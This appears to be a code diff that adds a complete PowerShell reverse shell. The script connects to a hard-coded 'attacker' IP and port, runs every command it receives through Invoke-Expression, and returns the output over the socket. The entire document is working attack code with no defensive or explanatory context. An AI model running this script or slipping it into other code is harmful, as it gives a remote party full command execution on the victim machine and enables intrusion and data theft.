@@ -1,0 +1,28 @@
+$attackerIP = "10.0.0.132"
+$attackerPort = 1234
+
+try {
+    $client = New-Object System.Net.Sockets.TCPClient($attackerIP, $attackerPort)
+    $stream = $client.GetStream()
+    $reader = [System.IO.StreamReader]::new($stream)
+    $writer = [System.IO.StreamWriter]::new($stream)
+    $writer.AutoFlush = $TRUE
+
+    while ($TRUE) {
+        $line = $reader.ReadLine()
+        if ($line -eq "exit") {
+            $client.Close()
+            break
+        }
+        try {
+            $cmd = (Invoke-Expression -Command $line 2>&1 | Out-String)
+        } catch {
+            $cmd = "Error: $_"
+        }
+        $writer.WriteLine($cmd)
+    }
+    $client.Close()
+} catch {
+    Write-Host "Connection failed: $_"
+    exit
+}
